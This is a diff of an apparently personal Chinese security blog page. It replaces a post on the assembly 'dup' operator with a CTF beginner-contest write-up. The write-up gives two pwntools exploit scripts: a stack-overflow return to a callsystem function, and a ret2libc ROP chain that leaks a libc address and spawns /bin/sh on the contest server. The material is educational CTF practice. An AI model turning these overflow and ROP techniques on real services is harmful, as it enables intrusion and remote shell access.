@@ -121,18 +121,25 @@
 
 
 
-  <meta name="description" content="dup是一个操作符，在汇编语言中同db、dw、dd、等一样。它是和db、dw、dd、等数据定义伪指令配合使用的，用来数据的重复。dup的使用格式如下：db 重复的次数 dup （重复的字节型数据）dw 重复的次数 dup （重复的字型数据）dd 重复的次数 dup （重复的双字符数据） 比如：1、3 dup (0)```123定义了三个字节，它们的值都是0，相当于db 0,0,0。2、 stack">
-<meta name="keywords" content="汇编语言">
+  <meta name="description" content="第一题 下载文件之后拖到IDA里看下，发现callsystem函数，那就简单了主函数如下  callsystem地址： 写出脚本：123456789from pwn import *s_addr=0x400596p=remote(&amp;quot;120.79.51.146&amp;quot;,10000)p.sendline(&amp;apos;a&amp;apos;*0x80+&amp;apos;a&amp;apos;*8+p64(s_a">
+<meta name="keywords" content="ctf">
 <meta property="og:type" content="article">
-<meta property="og:title" content="dup指令">
-<meta property="og:url" content="http://yoursite.com/2018/09/11/dup指令/index.html">
+<meta property="og:title" content="萌新赛">
+<meta property="og:url" content="http://yoursite.com/2018/10/13/中工萌新赛/index.html">
 <meta property="og:site_name" content="nocbtm&#39;s Blog">
-<meta property="og:description" content="dup是一个操作符，在汇编语言中同db、dw、dd、等一样。它是和db、dw、dd、等数据定义伪指令配合使用的，用来数据的重复。dup的使用格式如下：db 重复的次数 dup （重复的字节型数据）dw 重复的次数 dup （重复的字型数据）dd 重复的次数 dup （重复的双字符数据） 比如：1、3 dup (0)```123定义了三个字节，它们的值都是0，相当于db 0,0,0。2、 stack">
+<meta property="og:description" content="第一题 下载文件之后拖到IDA里看下，发现callsystem函数，那就简单了主函数如下  callsystem地址： 写出脚本：123456789from pwn import *s_addr=0x400596p=remote(&amp;quot;120.79.51.146&amp;quot;,10000)p.sendline(&amp;apos;a&amp;apos;*0x80+&amp;apos;a&amp;apos;*8+p64(s_a">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-09-11T13:15:28.797Z">
+<meta property="og:image" content="https://i.imgur.com/WzpekXu.png">
+<meta property="og:image" content="https://i.imgur.com/3grH6cf.png">
+<meta property="og:image" content="https://i.imgur.com/E7nmQQI.png">
+<meta property="og:image" content="https://i.imgur.com/McekReV.png">
+<meta property="og:image" content="https://i.imgur.com/gG0wskF.png">
+<meta property="og:image" content="https://i.imgur.com/hVFw4y1.png">
+<meta property="og:updated_time" content="2018-10-28T11:46:25.054Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="dup指令">
-<meta name="twitter:description" content="dup是一个操作符，在汇编语言中同db、dw、dd、等一样。它是和db、dw、dd、等数据定义伪指令配合使用的，用来数据的重复。dup的使用格式如下：db 重复的次数 dup （重复的字节型数据）dw 重复的次数 dup （重复的字型数据）dd 重复的次数 dup （重复的双字符数据） 比如：1、3 dup (0)```123定义了三个字节，它们的值都是0，相当于db 0,0,0。2、 stack">
+<meta name="twitter:title" content="萌新赛">
+<meta name="twitter:description" content="第一题 下载文件之后拖到IDA里看下，发现callsystem函数，那就简单了主函数如下  callsystem地址： 写出脚本：123456789from pwn import *s_addr=0x400596p=remote(&amp;quot;120.79.51.146&amp;quot;,10000)p.sendline(&amp;apos;a&amp;apos;*0x80+&amp;apos;a&amp;apos;*8+p64(s_a">
+<meta name="twitter:image" content="https://i.imgur.com/WzpekXu.png">
 
 
 
@@ -141,7 +148,7 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/09/11/dup指令/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/10/13/中工萌新赛/"/>
 
 
 
@@ -151,7 +158,7 @@
   };
 </script>
 
-  <title>dup指令 | nocbtm's Blog</title>
+  <title>萌新赛 | nocbtm's Blog</title>
   
 
 
@@ -364,7 +371,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/11/dup指令/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/13/中工萌新赛/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Nocbtm">
@@ -381,7 +388,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">dup指令
+          <h1 class="post-title" itemprop="name headline">萌新赛
               
             
           </h1>
@@ -406,12 +413,24 @@
                 
               
 
-              <time title="创建时间：2018-09-11 21:04:52 / 修改时间：21:15:28" itemprop="dateCreated datePublished" datetime="2018-09-11T21:04:52+08:00">2018-09-11</time>
+              <time title="创建时间：2018-10-13 20:09:51" itemprop="dateCreated datePublished" datetime="2018-10-13T20:09:51+08:00">2018-10-13</time>
             
 
             
               
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2018-10-28 19:46:25" itemprop="dateModified" datetime="2018-10-28T19:46:25+08:00">2018-10-28</time>
               
             
           </span>
@@ -425,8 +444,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2018/09/11/dup指令/#comments" itemprop="discussionUrl">
-                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/2018/09/11/dup指令/" itemprop="commentCount"></span>
+                <a href="/2018/10/13/中工萌新赛/#comments" itemprop="discussionUrl">
+                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/2018/10/13/中工萌新赛/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -434,7 +453,7 @@
 
           
           
-             <span id="/2018/09/11/dup指令/" class="leancloud_visitors" data-flag-title="dup指令">
+             <span id="/2018/10/13/中工萌新赛/" class="leancloud_visitors" data-flag-title="萌新赛">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -459,7 +478,7 @@
                 
                   <span class="post-meta-item-text">本文字数：</span>
                 
-                <span title="本文字数">251</span>
+                <span title="本文字数">1.2k</span>
               
 
               
@@ -493,9 +512,13 @@
       
 
       
-        <p>dup是一个操作符，在汇编语言中同db、dw、dd、等一样。它是和db、dw、dd、等数据定义伪指令配合使用的，用来数据的重复。<br>dup的使用格式如下：<br>db 重复的次数 dup （重复的字节型数据）<br>dw 重复的次数 dup （重复的字型数据）<br>dd 重复的次数 dup （重复的双字符数据）</p>
-<p>比如：<br>1、<br><figure class="highlight plain"><figcaption><span>3 dup (0)```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">定义了三个字节，它们的值都是0，相当于db 0,0,0。</span><br><span class="line"></span><br><span class="line">2、</span><br></pre></td></tr></table></figure></p>
-<p>stack segment<br>db 200 dup (0)<br>stack ends<br><code>`</code><br>定义了一个容量为200个字节的栈段</p>
+        <h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><p><img src="https://i.imgur.com/WzpekXu.png" alt=""></p>
+<p>下载文件之后拖到IDA里看下，发现callsystem函数，那就简单了<br><img src="https://i.imgur.com/3grH6cf.png" alt=""><br>主函数如下<br><img src="https://i.imgur.com/E7nmQQI.png" alt=""></p>
+<p><img src="https://i.imgur.com/McekReV.png" alt=""></p>
+<p>callsystem地址：<img src="https://i.imgur.com/gG0wskF.png" alt=""></p>
+<p>写出脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">s_addr=0x400596</span><br><span class="line"></span><br><span class="line">p=remote(&quot;120.79.51.146&quot;,10000)</span><br><span class="line"></span><br><span class="line">p.sendline(&apos;a&apos;*0x80+&apos;a&apos;*8+p64(s_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<h2 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h2><p><img src="https://i.imgur.com/hVFw4y1.png" alt=""></p>
+<p>拖到IDA没有（/bin/sh),也没有system函数，文件中给出了libc库，那就用吧<br>脚本如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&quot;debug&quot;</span><br><span class="line">p=remote(&quot;120.79.51.146&quot;,10002)</span><br><span class="line"></span><br><span class="line">elf=ELF(&quot;rop32&quot;)</span><br><span class="line">main_addr=0x08048460</span><br><span class="line">plt_write=elf.plt[&quot;write&quot;]</span><br><span class="line"></span><br><span class="line">payload = &quot;A&quot; * 0x88 + &quot;A&quot; * 4 + p32(plt_write) + p32(main_addr) + p32(1) + p32(elf.got[&quot;write&quot;]) + p32(4)</span><br><span class="line">p.send(payload)</span><br><span class="line">write_addr=u32(p.recv(4))</span><br><span class="line"></span><br><span class="line">print &quot;write_addr=&quot;+hex(write_addr)</span><br><span class="line"></span><br><span class="line">libc=ELF(&quot;libc6.so&quot;)</span><br><span class="line"></span><br><span class="line">libc_system=libc.symbols[&quot;system&quot;]</span><br><span class="line">libc_binsh=next(libc.search(&quot;/bin/sh&quot;))</span><br><span class="line">libc_write=libc.symbols[&quot;write&quot;]</span><br><span class="line">system_addr=write_addr-libc_write+libc_system</span><br><span class="line">binsh_addr=write_addr-libc_write+libc_binsh</span><br><span class="line">print &quot;system_addr=&quot;+hex(system_addr)</span><br><span class="line">raw_input()</span><br><span class="line"></span><br><span class="line">payload = &quot;A&quot; * 0x88 + &quot;A&quot; * 4 + p32(system_addr) + p32(0x77) + p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
 
       
     </div>
@@ -541,7 +564,7 @@
     <strong>本文作者： </strong>Nocbtm</li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="http://yoursite.com/2018/09/11/dup指令/" title="dup指令">http://yoursite.com/2018/09/11/dup指令/</a>
+    <a href="http://yoursite.com/2018/10/13/中工萌新赛/" title="萌新赛">http://yoursite.com/2018/10/13/中工萌新赛/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！</li>
@@ -554,7 +577,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/汇编语言/" rel="tag"><i class="fa fa-tag"></i> 汇编语言</a>
+            <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
           
         </div>
       
@@ -567,8 +590,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/09/11/div指令/" rel="next" title="div指令">
-                <i class="fa fa-chevron-left"></i> div指令
+              <a href="/2018/09/21/oj-level0和level1总结/" rel="next" title="oj level0和level1总结">
+                <i class="fa fa-chevron-left"></i> oj level0和level1总结
               </a>
             
           </div>
@@ -577,8 +600,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/09/11/操作符offset/" rel="prev" title="操作符offset">
-                操作符offset <i class="fa fa-chevron-right"></i>
+              <a href="/2018/10/24/stack-canary绕过思路/" rel="prev" title="stack canary绕过思路">
+                stack canary绕过思路 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -627,8 +650,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -727,6 +759,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#第一题"><span class="nav-number">1.</span> <span class="nav-text">第一题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第二题"><span class="nav-number">2.</span> <span class="nav-text">第二题</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
